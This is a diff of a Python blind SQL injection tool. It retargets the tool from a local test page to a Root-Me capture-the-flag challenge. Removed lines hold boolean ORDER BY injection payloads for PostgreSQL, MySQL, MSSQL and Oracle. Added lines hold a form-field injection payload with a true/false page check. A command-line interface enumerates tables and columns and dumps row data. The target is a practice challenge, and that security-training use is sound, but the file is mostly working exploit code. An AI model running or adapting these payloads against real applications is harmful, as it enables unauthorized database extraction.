@@ -8,60 +8,31 @@ import logging
 logging.basicConfig(level=logging.DEBUG)
 logging.getLogger("urllib3").setLevel(logging.WARNING)
 
-def postgre_analyze_func(text):
-	if 'ugol' in text:
-		return True
-	else:
-		return False
-
-def mysql_analyze_func(text):
-	if text.find('metal')<text.find('ugol'):
-		return True
-	else:
-		return False
-
-def mssql_analyze_func(text):
-	regex = '(?=<tr>)'
-	# print(regex)
-	if len(re.findall(regex,text)) == 2:
-		return True
-	else:
-		return False
-	raise Exception('not correct answer')
-
-def oracle_analyze_func(text):
-	if 'ORA-' in text:
-		return False
-	else:
-		return True
-
-analyze_functions = {'mysql':mysql_analyze_func,
-					'postgre':postgre_analyze_func,
-					'mssql':mssql_analyze_func,
-					'oracle':oracle_analyze_func}
-
 def request_func(sql):
 	"""this function must return True for sql=`1=1` and False for sql=`1=0`"""
-	
-	http_proxy   = "http://localhost:8080"
-	proxyDict = { 
-				 "https"   : http_proxy,	
-				 "http"   : http_proxy
-				}
-	#comment this for proxy
+
+	http_proxy = "http://localhost:8080"
+	proxyDict = {
+		"https": http_proxy,
+		"http": http_proxy
+	}
+	# comment this for proxy
 	proxyDict = None
-	target_db = 'postgre'
 
-	burp0_url = "http://localhost:8888/blind_orderby.php"
-	postgre_params = {"orderby":'(SELECT 1 order by 1/(case when (%s) then 1 else 0 end))' % sql, 'database':'postgre'}
-	mysql_params = {"orderby":'if((%s),name,vendor)' % sql, 'database':'mysql'}
-	mssql_params = {"orderby":"name offset (case when (%s) then 1 else 2 end) rows"%sql, 'database':'mssql'}
-	oracle_params = {"orderby":"(CASE WHEN (%s) THEN 1786 ELSE 2*(SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)" %sql,'database':'oracle'}
-	params = {'mysql': mysql_params, 'postgre':postgre_params, 'mssql':mssql_params,'oracle':oracle_params}
-	r = requests.get(burp0_url, params=params[target_db],proxies=proxyDict)
-	
+	burp0_url = "http://challenge01.root-me.org/web-serveur/ch19/?action=recherche"
+	burp0_headers = {"User-Agent": "fefefe", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
+					 "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://challenge01.root-me.org", "Connection": "close", "Referer": "http://challenge01.root-me.org/web-serveur/ch19/?action=recherche", "Upgrade-Insecure-Requests": "1"}
+	burp0_data = {"recherche": f"f' or ({sql}) -- "}
+	r = requests.post(burp0_url, headers=burp0_headers,
+					  data=burp0_data, proxies=proxyDict)
 
-	return analyze_functions[target_db](r.text)
+	if r.status_code != 200 or "Unable to prepare statement" in r.text:
+		logging.error(f"code: {r.status_code}, ошибка sql: {sql}")
+		exit(-1)
+	if "News system" in r.text:
+		return True
+	else:
+		return False
 
 
 
@@ -70,29 +41,31 @@ def required(arg, mode):
 	exit(-1)
 
 
-if __name__=='__main__':
+if __name__ == "__main__":
 	parser = argparse.ArgumentParser()
-	parser.add_argument("mode",help="mode - one of ['check','count','one','get','schemata','tables','columns','dump']",
-								choices= ['check','count','one','get','schemata','tables','columns','dump'])
-	parser.add_argument("-s","--schema",
-						help = "schema name");
-	parser.add_argument("-t","--table",
-						help = "table name");
-	parser.add_argument("-c","--column", nargs='+',
-						help="column names. For get mode could by comma separated array of columns")
-	parser.add_argument("-w", "--where", 
+	parser.add_argument("mode", help="mode - one of [\"check\",\"count\",\"one\",\"get\",\"tables\",\"columns\",\"dump\"]",
+						choices=["check", "count", "one", "get", "tables", "columns", "dump"])
+	parser.add_argument("-s", "--schema",
+						help="schema name")
+	parser.add_argument("-t", "--table",
+						help="table nmae")
+	parser.add_argument("-c", "--column", nargs="+",
+						help="column names. One or more, separated by space (ex, -c username password)\n expressions are acceptable (ex, -c substring(name,1,3) \"cast(id as TEXT)\"")
+	parser.add_argument("-w", "--where",
 						help="where clause")
-	parser.add_argument('-i','--index',help='index of row')
-	parser.add_argument("--threads",help="number of threads",type=int,default=16)
-	parser.add_argument('--dbms',help="DBMS",choices= ['mysql','mssql','sqlite','oracle','postgre'])
-	parser.add_argument("--order-by",help="order by column name or index")
+	parser.add_argument("-i", "--index", help="index of row")
+	parser.add_argument(
+		"--threads", help="number of threads", type=int, default=16)
+	parser.add_argument("--dbms", help="DBMS",
+						choices=["mysql", "mssql", "sqlite", "oracle", "postgre"])
+	parser.add_argument("--order-by", help="order by column name or index")
 	parser.add_argument("-v", "--verbose", help="disable logging debug",
 						default=False, action="store_true")
-	
-	args = parser.parse_args()
 
-	if args.threads <=0 :
-		print ('threads > 0')
+	args, _ = parser.parse_known_args()
+
+	if args.threads <= 0:
+		logging.error("threads > 0")
 		exit(-1)
 	if args.threads == 1:
 		multithreaded = False
@@ -158,16 +131,16 @@ if __name__=='__main__':
 		logging.info(sqlib.get(columns, args.table, args.where,
 						args.order_by))
 		exit(0)
-	elif args.mode == 'columns':
-		print (sqlib.get_columns(args.table))
+	elif args.mode == "columns":
+		logging.info(sqlib.get_columns(args.table))
 		exit(0)
-	elif args.mode == 'dump':
+	elif args.mode == "dump":
 		columns = sqlib.get_columns(args.table)
 		if columns is None:
-			print ('No columns extracted, exiting')
-			exit (-1)
-		print ('columns: ',columns)
-		print (sqlib.get(columns,args.table,args.where,
-						 args.order_by,verbose = not args.silent))
+			logging.info("No columns extracted, exiting")
+			exit(-1)
+		logging.info(f"columns: {columns}")
+		logging.info(sqlib.get(columns, args.table, args.where,
+						args.order_by))
 		exit(0)
 
